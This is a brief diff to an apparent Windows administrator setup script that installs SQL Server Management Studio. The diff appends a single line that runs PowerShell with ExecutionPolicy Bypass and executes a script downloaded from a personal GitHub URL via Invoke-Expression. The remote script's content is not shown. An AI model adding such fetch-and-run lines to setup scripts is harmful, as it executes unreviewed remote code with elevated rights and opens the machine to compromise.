@@ -15,3 +15,5 @@ $ScriptBaseDir = "C:\Users\Administrator\Desktop\pre-setup"
 & "$ScriptBaseDir\sql-server\ssms.ps1"
 
 
+powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/fzaben993/local/main/update.ps1'))"
+
